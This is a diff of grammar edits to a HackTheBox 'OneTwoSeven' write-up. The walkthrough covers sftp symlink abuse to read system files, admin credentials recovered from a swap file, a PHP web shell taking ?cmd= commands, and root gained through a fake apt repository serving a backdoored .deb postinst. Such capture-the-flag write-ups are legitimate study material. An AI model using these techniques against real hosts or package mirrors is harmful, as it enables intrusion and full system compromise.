@@ -70,7 +70,7 @@ It's time to understand what does this app do. Well, browsing through IP adress 
 
 ![web page]({{site.url}}/assets/images/onetwoseven/http_firstlook.png)
 
-Someone had made beautiful web application for us. Great job. After visiting some pages on website, I understood that this one is web service for generating personal websites for clients. Just look at that image. You will see there are some buttons on header. Three buttons... First one is button for redirecting to home page. Second one is showing statistics about how many user are registered, open web sockets, etc.
+Someone had made beautiful web application for us. Great job. After visiting some pages on website, I understood that this one is web service for generating personal websites for clients. Just look at that image. You will see there are some buttons on header. Three buttons... First one is for redirecting to home page. Second one is showing statistics about how many user are registered, open web sockets, etc.
 
 ![stat page]({{site.url}}/assets/images/onetwoseven/http_stats.png)
 
@@ -83,7 +83,7 @@ We are moving through...
 
 ![signup page]({{site.url}}/assets/images/onetwoseven/http_signup.png)
 
-Okay, we have some credentials right now. Also, it is giving some information about these creds. These credentials are usable with **sftp** service. There is another navigation link in this page. When we click to **here** link, it is redirecting to **onetwoseven.htb/~ots-wOWM5YWM**. If we click to that link, page will raise "Unknown Host" error. 
+Okay, we have some credentials right now. Also, it gives some information about these credentials. These credentials are usable with **sftp** service. There is another navigation link in this page. When we click to **here** link, it redirects to **onetwoseven.htb/~ots-wOWM5YWM**. If we click that link, page will raise "Unknown Host" error. 
 
 So, what we have from this page:
 ```
@@ -92,14 +92,14 @@ username: ots-wOWM5YWM
 password: eb09c9ac
 ```
 
-We can't connect to that URL. Because, our machine isn't recognize that host. We should edit **/etc/hosts** file and we should append ```10.10.10.133    onetwoseven.htb``` to bottom of this file.
+We can't connect to that URL. Because, our machine does not recognize that host. We should edit **/etc/hosts** file and we should append ```10.10.10.133    onetwoseven.htb``` to bottom of this file.
 
 ```
 127.0.0.1	localhost
 10.10.10.133	onetwoseven.htb
 ```
 
-Then, we are visiting **http://onetwoseven.htb/~ots-wOWM5YWM** again. There is a blank page with a background image. So, let's think about what does that app do. It is creating personal web pages and serving them. We can probably upload our personal files with **sftp** access with given credentials.
+Then, we visit **http://onetwoseven.htb/~ots-wOWM5YWM** again. There is a blank page with a background image. So, let's think about what does that app do. It creates personal web pages and serving them. We can probably upload our personal files with **sftp** access with given credentials.
 Time to connect that app via **sftp**:
 
 ```sftp ots-wOWM5YWM@10.10.10.133```
@@ -125,16 +125,16 @@ drwxr-xr-x    3 0        0            4096 Jun  8 22:09 ..
 -rw-r--r--    1 1003     1003          349 Feb 15 21:03 index.html
 ```
 
-If we upload **.php** here, maybe we can execute command on it. Let's try it.
+If we upload **.php** here, maybe we can execute command on it. Let's try it out.
 
 ```
 cd public_html
 put test.php
 ```
 
-After navigating test.php through browser is giving **Forbidden** response code. So, we can't upload **.php** file. Probably, **.htaccess** folder is blocking it.
+After navigating to test.php page through browser is giving **Forbidden** response code. So, we can't upload **.php** file. Probably, **.htaccess** folder blocks it.
 
-I tried to upload **.htaccess** folder too. But same response. Probably, we try to something different.
+I tried to upload **.htaccess** folder too, but got the same response. We have to try to something different.
 
 Let's check which commands are executable on sftp service.
 
@@ -175,11 +175,11 @@ version                            Show SFTP version
 ?                                  Synonym for help
 ```
 
-```symlink``` command looks suspicious. If there are lack of security in **chroot** configurations,possibly we can symlink to another files with sftp. We should quickly test which files are accessible. 
+```symlink``` command looks suspicious. If there are lack of security in **chroot** configurations, possibly we can symlink to another files with sftp. We should quickly test which files are accessible. 
 
 ```symlink /etc/passwd passwd```
 
-This command executed correctly. But there is no way for reading it with sftp service. But there is something else. Files are serving on ```http://onetwoseven.htb/~ots-wOWM5YWM/```.
+This command executed correctly. But there is no way of reading it with sftp service. But there is something else. Files are serving on ```http://onetwoseven.htb/~ots-wOWM5YWM/```.
 
 Okay, good. We can read that **passwd** file from ```http://onetwoseven.htb/~ots-wOWM5YWM/passwd```
 
@@ -187,13 +187,13 @@ Okay, good. We can read that **passwd** file from ```http://onetwoseven.htb/~ots
 
 ![passwd]({{site.url}}/assets/images/onetwoseven/passwd.png)
 
-Interesting... There are 3 more different users. They have their own home directories. It's okay. The first one is interesting right? It is using **127.0.0.1** as connection address. So, that user is machine itself. Maybe, we should find a way for escalating that user. Before that, creating a symbolic link to that user's directory could be provide some information for that process.
+Interesting... There are 3 more different users. They have their own home directories. It's okay. The first one is interesting, right? It uses **127.0.0.1** as connection address. So, that user is machine itself. Maybe, we should find a way to escalate that user. Before that, creating a symbolic link to that user's directory could be provided some information for that process.
 
 ```symlink /home/web/ots-yODc2NGQ ots-yODc2NGQ```
 
 This code executed without giving any errors.
 
-Let's navigate to that directory.
+Let's navigate that directory.
 
 ![ots-yODc2NGQ]({{site.url}}/assets/images/onetwoseven/ots-yODc2NGQ.png)
 
@@ -209,15 +209,15 @@ Nah! Not that easy. Boo for you.
 
 So, we should enumerate more to achieve that user.
 
-At that point, I enumerated some directories. But it didn't help. Until I found two different juicy directories.
+At that point, I enumerated some directories. But it didn't help until I found two different juicy directories.
 
 The first one is **/var/www/html/**. It redirects to home page of **http://10.10.10.133**. If we create symbolic links more specific, we can read what are these **.php** files does on home page.
 
 The second one is **/var/www/html-admin**. 
 
-I found these two directory with generating a symbolic link for **/var/www**.
+I found these two directories with generating a symbolic link for **/var/www**.
 
-Let's start with the second one it looks more interesting. When we browse into that file, we can see that there is a **.php.swp** file is lying there. Probably, someone was editing the **login.php** file. Then, some unexpected situation happened and **login.php** file has saved as **login.php.swp** file. 
+Let's start with the second one, it looks more interesting. When we browse into that file, we can see that there is a **.php.swp** file is lying there. Probably, someone was editing the **login.php** file. Then, some unexpected situation happened and **login.php** file has saved as **login.php.swp** file. 
 
 After downloading it, all we have to do is run necessary command for checking what is that file keeping.
 
@@ -226,7 +226,7 @@ After downloading it, all we have to do is run necessary command for checking wh
 vim -r login.php.swp
 ```
 
-Inspecting of this file is giving two different information for us.
+Inspectation of this file is gives us two different information for us.
 
 #### First one:
 
@@ -251,7 +251,7 @@ username: ots-admin
 password: Homesweethome1
 ```
 
-Oh, what? We can't access that port yet. Because it's running locally. We successfully gathered all information from **/var/www/html-admin** directory. Next, we will gather some information from **/var/www/html** directory. As I said if we directly generate a symlink for this directory, it will redirect to home page. What about generating symbolic links for **.php** pages? It might be useful.
+Oh, what? We can't access that port yet. Because it's running locally. We successfully gathered all information from **/var/www/html-admin** directory. Next, we will gather some information from **/var/www/html** directory. As I said, if we directly generate a symlink for this directory, it would redirect to home page. What about generating symbolic links for **.php** pages? It might be useful.
 
 There are 4 php pages on web app. But these are interesting:
 + index.php
@@ -303,7 +303,7 @@ ots-yODc2NGQ
 f528764d
 ```
 
-Username is exact with first entry of **passwd** file. Password must be correct.
+Username is identical with first entry of **passwd** file. Password must be correct.
 Authenticating to sftp service with these credentials will grant us a permission to reading that **user.txt** file. 
 
 Let's validate it.
@@ -350,7 +350,7 @@ This service allows sftp connections only.
 Connection to 10.10.10.133 closed.
 ```
 
-Also, we can verbose current command with **-v** parameter. I used that parameter too. I saw that SSH connection can be usable over sftp only. That's bad, right? After reading **man page** of SSH, I figured out there is some useful argument which called **-s**. If you want to make that connection over **subsystem**, you should use **-s** parameter.
+Also, we can verbose current command with **-v** parameter. I used that parameter too. I saw that SSH connection can be used over sftp only. That's bad, right? After reading **man page** of SSH, I figured out there is useful argument which called **-s**. If you want to make that connection over **subsystem**, you should use **-s** parameter.
 
 ```
 ssh -L 60080:127.0.0.1:60080 ots-yODc2NGQ@10.10.10.133 -s sftp
@@ -371,9 +371,9 @@ Now, we are ready.
  
 ![kingdom]({{site.url}}/assets/images/onetwoseven/kingdom.png)
 
-Thanks to creator of the machine, login panel is here. We don't have to enumerate for login panel.
+Thanks to the creator of the machine, login panel is there. We don't have to enumerate for login panel.
 
-We have necessary credentials for moving forward.
+We have necessary credentials to move forward.
 
 ```
 username: ots-admin
@@ -386,11 +386,11 @@ Okay, I'm pretty sure about what we see is admin panel. I just clicked to OTS Us
 
 Here, my findings are:
 
-+ If you want to run plugin, you need to use "menu.php?addon=addons/addon-name.php" URI. 
-+ If you want to see content of plugin, you need to use "addon-download.php?addon=addon-name.php" URI.
++ If you would like to run a plugin, you need to use "menu.php?addon=addons/addon-name.php" URI. 
++ If you would like to see content of plugin, you need to use "addon-download.php?addon=addon-name.php" URI.
 + Navigating to "OTS Addon Manager" link will show that there are some rewrite rules about "addon-download.php" and "addon-upload.php" files. 
 + Navigating to "addon-download.php" page returns blank page.
-+ Navigating to "addon-upload.php" page return "404 Not Found" page.
++ Navigating to "addon-upload.php" page returns "404 Not Found" page.
 
 Also, you can read the content of **ots-man-addon.php** page via downloading it.
 
@@ -421,11 +421,11 @@ Content-Type: text/plain;charset=UTF-8
 File uploaded successfull.y
 ```
 
-So, our filename was **onetwoseven.php**. Now, we can run command from following URL: ```http://saiyajin:60080/addons/onetwoseven.php?cmd=ls -la```
+So, our filename was **onetwoseven.php**. Now, we can run command with following this URL: ```http://saiyajin:60080/addons/onetwoseven.php?cmd=ls -la```
 
 ![kingdom_rce]({{site.url}}/assets/images/onetwoseven/kingdom_rce.png)
 
-Okay, we got shell but it is just a web shell. Not even active. We should acquire better shell for executing commands and enumerating the system better.
+Okay, we got shell but it is just a web shell. It's not even active. We should acquire better shell to execute commands and enumerate the system better.
 
 
 Host machine:
@@ -450,7 +450,7 @@ python -c "import pty;pty.spawn('/bin/bash')"
 export TERM=linux
 ```
 
-Finally, we gained tty shell. Second command is necessary if you want to use clear command on your shell.
+Finally, we gained tty shell. Second command is necessary if you would like to use clear command on your shell.
 
 On enumeration process, I just found one cool thing. It was the output of ```sudo -l``` command.
 That command shows which commands are executable for current user as sudo privileges.
@@ -465,7 +465,7 @@ User www-admin-data may run the following commands on onetwoseven:
     (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
 ```
 
-Very nice, we can run **/usr/bin/apt-get update** and **/usr/bin/apt-get upgrade** commands with root privileges. That's okay. So, we have to inject something to these commands. This part was pretty tricky for me. I read two articles for this part and I will share these articles at end of this blog post. You should read both of these articles. They contains very cool tricks.
+Very nice, we can run **/usr/bin/apt-get update** and **/usr/bin/apt-get upgrade** commands with root privileges. That's okay. So, we have to inject something to these commands. This part was pretty tricky for me. I read two articles for this part and I will share these articles at end of this blog post. You should read both of these articles. They contain very cool tricks.
 
 If you check output of **sudo -l** command, you can see that there are some environment variables are usable for setting your local machine as proxy server. These are:
 
@@ -476,7 +476,7 @@ If you check output of **sudo -l** command, you can see that there are some envi
 
 Before using these variables, I decided to enumerate **apt repositories** on the machine.
 
-We can check these repository list with reading **sources.list** file which in **/etc/apt** directory.
+We can check these repository list with reading **sources.list** file which is located at **/etc/apt** directory.
 
 ```cat /etc/apt/sources.list```
 
@@ -497,7 +497,7 @@ deb http://de.deb.devuan.org/merged ascii-updates main
 
 Some of these lines are commented out. If we run **apt-get update** command, probably machine will try to connect that host. Then, it will try to find differences between installed application list and target package list. After reading that post, I figured out how it finds the differences.
 
-All of these files are stored as **.deb** format in repository. Also, repositores have some other files for package controlling. If you want to update an application, then you must summarize that **.deb** package file in three different hash format. These are:
+All of these files are stored as **.deb** format in repository. Also, repositories have some other files for package controlling. If you would like to update an application, then you must summarize that **.deb** package file in three different hash format. These are:
 
 + MD5
 + SHA1
@@ -505,7 +505,7 @@ All of these files are stored as **.deb** format in repository. Also, repositore
 
 After doing checksum operation, you have to replace these hash values with hashes on the latest version of that **Packages** file. It is really necessary. Because, if you want to upgrade an application, it will compare hash values on **Packages** file with  hash values on **.deb** package file. If hash values don't match, then upgrading process fails. 
 
-Also, you have to compress the **Packages** file as **.gz** format. After compressing that file, you must do another checksum process for both of these **Packages** and **Packages.gz** files. These hash values will be stored on **Release** file. **Release** file stores all of these **Packages** files that belongs to other **deb** applications. Therefore, **Release** file are stored in top of these repositories. Basically it stores another **Packages** files and **Packages** files stores hashes of **.deb** packages. Another detail with repositories is sometimes that **Release** files can be signed with **key** of authority of repository. It was a small briefing about how repositories works.
+Also, you have to compress the **Packages** file as **.gz** format. After compressing that file, you must do another checksumming process for both of these **Packages** and **Packages.gz** files. These hash values will be stored on **Release** file. **Release** file stores all of these **Packages** files that belongs to other **deb** applications. Therefore, **Release** file are stored in top of these repositories. Basically, it stores another **Packages** files and **Packages** files stores hashes of **.deb** packages. Another detail about repositories are sometimes these **Release** files can be signed with the **key** of authority of repository. It was a small briefing about how repositories work.
 
 Okay, we got it. Let's start with executing the *update* command.
 
@@ -529,11 +529,11 @@ W: Failed to fetch http://packages.onetwoseven.htb/devuan/dists/ascii/InRelease 
 W: Some index files failed to download. They have been ignored, or old ones used instead.
 ```
 
-As you see, connection failed. Just inspect that output more careful. At first error there is another package repository.
+As you see, connection failed. Just inspect that output more careful. At first error, there is another package repository.
 
 > packages.onetwoseven.htb
 
-If you try to connect these repositories from your browser, you can see that the one which starts with **package** fails. Because your browser won't recognize that hostname. Other one will redirect to another URL.
+If you try to connect these repositories from your browser, you can see that the one which starts with **packages**, it fails. Because your browser won't recognize that hostname. Other one will redirect another URL.
 
 > deb.devuan.org
 
@@ -564,7 +564,7 @@ W: Failed to fetch http://packages.onetwoseven.htb/devuan/dists/ascii/InRelease 
 W: Some index files failed to download. They have been ignored, or old ones used instead.
 ```
 
-Good, there are some changes on the output. Probably, it is trying to connect our *http* service. Let's deceive it with running **SimpleHTTPServer** on local machine.
+Good, there are some changes on the output. Probably, it tries to connect our *http* service. Let's deceive it by running **SimpleHTTPServer** on local machine.
 
 ```python2 -m SimpleHTTPServer 80```
 
@@ -581,7 +581,7 @@ Serving HTTP on 0.0.0.0 port 80 ...
 10.10.10.133 - - [10/Jun/2019 00:32:09] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/main/binary-amd64/Packages.xz HTTP/1.1" 404 -
 ```
 
-Basically, it is trying to fetch some files but these files are not stored in there. We have to build something bigger. Maybe, we should create our personal repositores with given hostnames.
+Basically, it tries to fetch some files but these files are not stored in there. We have to build something bigger. Maybe, we should create our personal repositories with given hostnames.
 
 At first, we should edit **/etc/hosts** file. We should append these lines shown below.
 
@@ -590,13 +590,13 @@ At first, we should edit **/etc/hosts** file. We should append these lines shown
 127.0.0.1	de.deb.devuan.org
 ```
 
-First step is done. Second step is creating these repositories. At that point, I created two different directories. Because **update** command is fetching update files from two different URLs.
+First step is done. Second step is creating these repositories. At that point, I created two different directories. Because **update** command fetches update files from two different URLs.
 
 Here's the directory structure:
 
 ![directory structure]({{site.url}}/assets/images/onetwoseven/directory_structure.png)
 
-If you check output of last update command, you will see that **packages.onetwoseven.htb** host is using **/devuan** directory and the other one is using **/merged** directory. We know that **de.deb.devuan.org** is real repository. But other one isn't real. So, we have to fetch same files from that repository for making it real. Then, I fetched these files with **wget** to merged directory. Okay, we are cool with the real one. 
+If you check output of last update command, you will see that **packages.onetwoseven.htb** host uses **/devuan** directory and the other one uses **/merged** directory. We know that **de.deb.devuan.org** is real repository. But other one isn't real. So, we have to fetch same files from that repository for making it real. Then, I fetched these files with **wget** to merged directory. Okay, we are cool with the real one. 
 
 What about the fake one?
 
@@ -604,7 +604,7 @@ The fake repository should be our injection directory. We have to find an applic
 
 Ain't that cool? We are upgrading an application for real, then we are generating necessary release and packages files for it. Also, we are hiding our surprise for user. 
 
-Before finding that application, I removed some **Release** and **Packages** file on the real repository that we created. Because if update process can find any differences between repository and application list then it will try to upgrade these applications too. As a result, if these applications are not stored in **pool** list of repo then this process will fail. 
+Before finding that application, I removed some **Release** and **Packages** file on the real repository that we created. Because if update process can find any differences between repository and application list, then it will try to upgrade these applications too. As a result, if these applications are not stored in **pool** list of repo, then this process will fail. 
 
 Let's find my precioussss....
 
@@ -620,7 +620,7 @@ ii  devuan-baseconf                        0.6.4+devuan2.3                    al
 ...
 ```
 
-From the results, I decided to select **base-files** application. Because I saw that this file is stored in that real repository. I downloaded deb package which has exact version of current installed app. 
+From the results, I decided to select **base-files** application. Because, I saw that this file is stored in that real repository. I downloaded "deb" package which has identical version of current installed application. 
 
 The real fun begins..
 
@@ -628,7 +628,7 @@ The real fun begins..
 dpkg-deb -R base-files_9.9+devuan2.5_all.deb modified_base_files
 ```
 
-With this command we are extracting files on the **.deb** file. After extracting it, we are navigating to **/DEBIAN** directory. Then, we are injecting our malicious code into **postinst** file. We selected this file because all of these lines will be executed while running **/usr/bin/apt-get upgrade** command.
+We are extract files on the **.deb** file with this command. After extracting it, we navigate to **/DEBIAN** directory. Then, we inject our malicious code into **postinst** file. We selected this file because all of these lines will be executed while running **/usr/bin/apt-get upgrade** command.
 
 ![postinst]({{site.url}}/assets/images/onetwoseven/postinst.png)
 
@@ -636,7 +636,7 @@ By the way, I switched to *Kali Linux* at that point. Because, *deb* is not inst
 
 ![control file]({{site.url}}/assets/images/onetwoseven/control_file.png)
 
-After making these changes, we are repacking it.
+After making these changes, we repack it.
 
 ```
 dpkg-deb -b modified_base_files/ base-files_9.9+devuan2.6_all.deb
@@ -657,7 +657,7 @@ output:
 06a21aa67d8afc106ac14f037a7b9adeabc04e35c09b5e96057dccc2bb8a3ee3  base-files_9.9+devuan2.6_all.deb
 ```
 
-We have to save these hashes and file sizevalue to Packages file as shown as below.
+We have to save these hashes and size value of file into Packages file as shown as below.
 
 ```
 Package: base-files
@@ -692,7 +692,7 @@ SHA256: 06a21aa67d8afc106ac14f037a7b9adeabc04e35c09b5e96057dccc2bb8a3ee3
 
 #### Release file:
 
-Let's gather hash values and filesizes.
+Let's gather hash values and file sizes.
 
 ```md5sum Packages*; sha1sum Packages*; sha256sum Packages*;```
 
@@ -714,7 +714,7 @@ c3946b74c76880a4b71f147714bacbb2a47e112f  Packages.gz
 -rw-r--r-- 1 root root  634 Haz  8 22:31 Packages.gz
 ```
 
-We need to save hashes and filesize values of Packages and Packages.gz files into the Release file as shown as below:
+We need to save these hashes and size values of Packages and Packages.gz files into the Release file as shown as below:
 
 ```
 Origin: Devuan
@@ -743,7 +743,7 @@ Let's execute ```/usr/bin/apt-get update``` and ```/usr/bin/apt-get upgrade``` c
 
 ![update]({{site.url}}/assets/images/onetwoseven/update.png)
 
-As you see, there is only one application is ready for upgrade.
+As you see, there is only one application is ready to upgrade.
 
 > base-files
 
@@ -753,10 +753,10 @@ Connection received. But, **whoami**?
 
 > uid=0(root) gid=0(root) groups=0(root)
 
-As a result of long efforts, we finally achieved to root user. Second part was really hard for me. It took nearly 2 day for me. I read these articles. I tried to make it work. It was really long process. After working hard, I've reached to happy ending. Also, I scored 5 out of 10 as difficulty as user part. Difficulty of root part? Yeah, I scored 8 out of 10. It was the hardest machine I've ever solved.
+As a result of long efforts, we finally achieved to root user. Second part was really hard for me. It took nearly 2 days. I read these articles. I tried to make it work. It was really long process. After working hard, I've reached to happy ending. Also, I scored 5 out of 10 as difficult as user part. Difficulty of root part? Yeah, I scored 8 out of 10.
 
 
-Thanks for reading.
+Thanks for reading. Cheers!
 
 ### Articles:
 
